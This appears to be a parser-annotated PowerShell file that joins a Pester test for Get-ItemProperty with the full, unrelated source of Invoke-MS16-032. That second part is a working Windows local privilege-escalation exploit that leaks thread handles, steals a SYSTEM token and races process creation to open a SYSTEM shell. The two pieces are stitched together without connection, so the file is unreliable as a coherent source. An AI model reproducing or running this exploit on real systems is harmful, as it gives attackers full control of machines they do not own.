

 -||-> Describe "Get-ItemProperty" -Tags "CI" {
     -||-> $currentDirectory =  -||-> Split-Path $PSScriptRoot -Leaf <-||-  <-||- 
     -||-> $parentDirectory  =  -||-> Split-Path ( -||-> Join-Path -Path $PSScriptRoot -ChildPath ".." <-||- ) -Leaf <-||-  <-||- 
     -||-> $tempDirectory = $TestDrive <-||- 
     -||-> $testprovider = ( -||-> Get-Item $tempDirectory <-||- ).PSDrive.Name <-||- 

     -||-> $testfile =  -||-> Join-Path -Path $tempDirectory -ChildPath testfile1 <-||-  <-||- 

     -||-> New-Item $testfile -ItemType file -Force <-||- 

     -||-> It "Should be able to be called on in the current directory" {
	 -||-> $( -||-> Get-ItemProperty $PSScriptRoot <-||- ).Name | Should -BeExactly $currentDirectory <-||- 
    } <-||- 

     -||-> It "Should be able to be called on a parent directory" {
	 -||-> ( -||-> Get-ItemProperty $PSScriptRoot/.. <-||- ).Name | Should -BeExactly $parentDirectory <-||- 
    } <-||- 

     -||-> It "Should be able to be called on a directory using the path switch" {
	 -||-> {  -||-> Get-ItemProperty -Path $tempDirectory <-||-  } | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should be able to be called on a file using the path switch" {
	 -||-> {  -||-> Get-ItemProperty -Path $testfile <-||-  } | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should be able to access a property using the Path and name switches" {
	 -||-> {  -||-> Get-ItemProperty -Path $testfile -Name fullname <-||-  } | Should -Not -Throw <-||- 

	 -||-> $output =  -||-> Get-ItemProperty -Path $testfile -Name fullname <-||-  <-||- 

	 -||-> $output.PSPath | Should -Not -BeNullOrEmpty <-||- 

	 -||-> $output.PSDrive | Should -Be $testprovider <-||- 

	 -||-> $output.PSProvider.Name | Should -Be "FileSystem" <-||- 
    } <-||- 

     -||-> It "Should be able to use the gp alias without error" {
	 -||-> {  -||-> gp . <-||-  }  | Should -Not -Throw <-||- 
	 -||-> {  -||-> gp .. <-||-  } | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should have the same results between alias and cmdlet" {
	 -||-> $alias  =  -||-> gp -Path $testfile -Name fullname <-||-  <-||- 
	 -||-> $cmdlet =  -||-> Get-ItemProperty -Path $testfile -Name fullname <-||-  <-||- 

	 -||-> $alias.PSPath          | Should -Be $cmdlet.PSPath <-||- 
	 -||-> $alias.PSDrive         | Should -Be $cmdlet.PSDrive <-||- 
	 -||-> $alias.PSProvider.Name | Should -Be $cmdlet.PSProvider.Name <-||- 
    } <-||- 
} <-||- 
 -||-> function Invoke-MS16-032 {

	 -||-> Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}
	
	public static class Ntdll
	{
		[DllImport("ntdll.dll", SetLastError=true)]
		public static extern int NtImpersonateThread(
			IntPtr ThreadHandle,
			IntPtr ThreadToImpersonate,
			ref SQOS SecurityQualityOfService);
	}
"@ <-||- 
	
	 -||-> function Get-ThreadHandle {
		
		 -||-> $StartupInfo =  -||-> New-Object STARTUPINFO <-||-  <-||- 
		 -||-> $StartupInfo.dwFlags = 0x00000100 <-||-  
		 -||-> $StartupInfo.hStdInput = [Kernel32]::GetCurrentThread() <-||- 
		 -||-> $StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread() <-||- 
		 -||-> $StartupInfo.hStdError = [Kernel32]::GetCurrentThread() <-||- 
		 -||-> $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) <-||-  
		
		
		 -||-> $ProcessInfo =  -||-> New-Object PROCESS_INFORMATION <-||-  <-||- 
		
		
		 -||-> $GetCurrentPath = ( -||-> Get-Item -Path ".\" -Verbose <-||- ).FullName <-||- 
		
		
		 -||-> $CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, "C:\Windows\System32\cmd.exe", "",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo) <-||- 
		
		
		 -||-> $lpTargetHandle = [IntPtr]::Zero <-||- 
		 -||-> $CallResult = [Kernel32]::DuplicateHandle(
			$ProcessInfo.hProcess, 0x4,
			[Kernel32]::GetCurrentProcess(),
			[ref]$lpTargetHandle, 0, $false,
			0x00000002) <-||- 
		
		
		 -||-> $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1) <-||- 
		 -||-> $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess) <-||- 
		 -||-> $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread) <-||- 
		
		 -||-> $lpTargetHandle <-||- 
	} <-||- 
	
	 -||-> function Get-SystemToken {
		 -||-> echo "`n[?] Thread belongs to: $( -||-> $( -||-> Get-Process -PID $( -||-> [Kernel32]::GetProcessIdOfThread($hThread) <-||- ) <-||- ).ProcessName <-||- )" <-||- 
	
		 -||-> $CallResult = [Kernel32]::SuspendThread($hThread) <-||- 
		 -||-> if ( -||-> $CallResult -ne 0 <-||- ) {
			 -||-> echo "[!] $hThread is a bad thread, exiting.." <-||- 
			Return
		} <-||-   -||-> echo "[+] Thread suspended" <-||- 
		
		 -||-> echo "[>] Wiping current impersonation token" <-||- 
		 -||-> $CallResult = [Advapi32]::SetThreadToken([ref]$hThread, [IntPtr]::Zero) <-||- 
		 -||-> if ( -||-> !$CallResult <-||- ) {
			 -||-> echo "[!] SetThreadToken failed, exiting.." <-||- 
			 -||-> $CallResult = [Kernel32]::ResumeThread($hThread) <-||- 
			 -||-> echo "[+] Thread resumed!" <-||- 
			Return
		} <-||- 
		
		 -||-> echo "[>] Building SYSTEM impersonation token" <-||- 
		
		 -||-> $SQOS =  -||-> New-Object SQOS <-||-  <-||- 
		 -||-> $SQOS.ImpersonationLevel = 2 <-||-  
		 -||-> $SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS) <-||- 
		
		 -||-> $CallResult = [Ntdll]::NtImpersonateThread($hThread, $hThread, [ref]$sqos) <-||- 
		 -||-> if ( -||-> $CallResult -ne 0 <-||- ) {
			 -||-> echo "[!] NtImpersonateThread failed, exiting.." <-||- 
			 -||-> $CallResult = [Kernel32]::ResumeThread($hThread) <-||- 
			 -||-> echo "[+] Thread resumed!" <-||- 
			Return
		} <-||- 
		
		
		 -||-> $script:SysTokenHandle = [IntPtr]::Zero <-||- 

		
		 -||-> $CallResult = [Advapi32]::OpenThreadToken($hThread, 0x0006, $false, [ref]$SysTokenHandle) <-||- 
		 -||-> if ( -||-> !$CallResult <-||- ) {
			 -||-> echo "[!] OpenThreadToken failed, exiting.." <-||- 
			 -||-> $CallResult = [Kernel32]::ResumeThread($hThread) <-||- 
			 -||-> echo "[+] Thread resumed!" <-||- 
			Return
		} <-||- 
		
		 -||-> echo "[?] Success, open SYSTEM token handle: $SysTokenHandle" <-||- 
		 -||-> echo "[+] Resuming thread.." <-||- 
		 -||-> $CallResult = [Kernel32]::ResumeThread($hThread) <-||- 
	} <-||- 
	
	
	 -||-> $ms16032 = @"
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]
"@ <-||- 
	
	 -||-> $ms16032 <-||- 
	
	
	 -||-> echo "`n[?] Operating system core count: $( -||-> [System.Environment]::ProcessorCount <-||- )" <-||- 
	 -||-> if ( -||-> $( -||-> [System.Environment]::ProcessorCount <-||- ) -lt 2 <-||- ) {
		 -||-> echo "[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n" <-||- 
		Return
	} <-||- 
	
	 -||-> echo "[>] Duplicating CreateProcessWithLogonW handle" <-||- 
	 -||-> $hThread =  -||-> Get-ThreadHandle <-||-  <-||- 
	
	
	 -||-> if ( -||-> $hThread -eq 0 <-||- ) {
		 -||-> echo "[!] No valid thread handle was captured, exiting!`n" <-||- 
		Return
	} else {
		 -||-> echo "[?] Done, using thread handle: $hThread" <-||- 
	} <-||-   -||-> echo "`n[*] Sniffing out privileged impersonation token.." <-||- 
	
	
	 -||-> Get-SystemToken <-||- 
	
	
	 -||-> if ( -||-> $SysTokenHandle -eq 0 <-||- ) {
		Return
	} <-||- 
	
	 -||-> echo "`n[*] Sniffing out SYSTEM shell.." <-||- 
	 -||-> echo "`n[>] Duplicating SYSTEM token" <-||- 
	 -||-> $hDuplicateTokenHandle = [IntPtr]::Zero <-||- 
	 -||-> $CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle) <-||- 
	
	
	 -||-> echo "[>] Starting token race" <-||- 
	 -||-> $Runspace = [runspacefactory]::CreateRunspace() <-||- 
	 -||-> $StartTokenRace = [powershell]::Create() <-||- 
	 -||-> $StartTokenRace.runspace = $Runspace <-||- 
	 -||-> $Runspace.Open() <-||- 
	 -||-> [void]$StartTokenRace.AddScript({
		Param ($hThread, $hDuplicateTokenHandle)
		 -||-> while ( -||-> $true <-||- ) {
			 -||-> $CallResult = [Advapi32]::SetThreadToken([ref]$hThread, $hDuplicateTokenHandle) <-||- 
		} <-||- 
	}).AddArgument($hThread).AddArgument($hDuplicateTokenHandle) <-||- 
	 -||-> $AscObj = $StartTokenRace.BeginInvoke() <-||- 
	
	 -||-> echo "[>] Starting process race" <-||- 
	
	 -||-> $SafeGuard = [diagnostics.stopwatch]::StartNew() <-||- 
	 -||-> while ( -||-> $SafeGuard.ElapsedMilliseconds -lt 10000 <-||- ) {

		
		 -||-> $StartupInfo =  -||-> New-Object STARTUPINFO <-||-  <-||- 
		 -||-> $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) <-||-  
		
		
		 -||-> $ProcessInfo =  -||-> New-Object PROCESS_INFORMATION <-||-  <-||- 
		
		
		 -||-> $GetCurrentPath = ( -||-> Get-Item -Path ".\" -Verbose <-||- ).FullName <-||- 
		
		
		 -||-> $CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, "C:\Windows\System32\cmd.exe", "",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo) <-||- 
		
		
		
		
		
		
		
		
		
		 -||-> if ( -||-> !$CallResult <-||- ) {
			continue
		} <-||- 
			
		 -||-> $hTokenHandle = [IntPtr]::Zero <-||- 
		 -||-> $CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle) <-||- 
		
		 -||-> if ( -||-> !$CallResult <-||- ) {
			 -||-> echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n" <-||- 
			 -||-> $CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread) <-||- 
			 -||-> $StartTokenRace.Stop() <-||- 
			 -||-> $SafeGuard.Stop() <-||- 
			Return
		} <-||- 
			
		
		 -||-> $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1) <-||- 
		 -||-> $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess) <-||- 
		 -||-> $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread) <-||- 

	} <-||- 
	
	
	 -||-> $StartTokenRace.Stop() <-||- 
	 -||-> $SafeGuard.Stop() <-||- 
} <-||- 

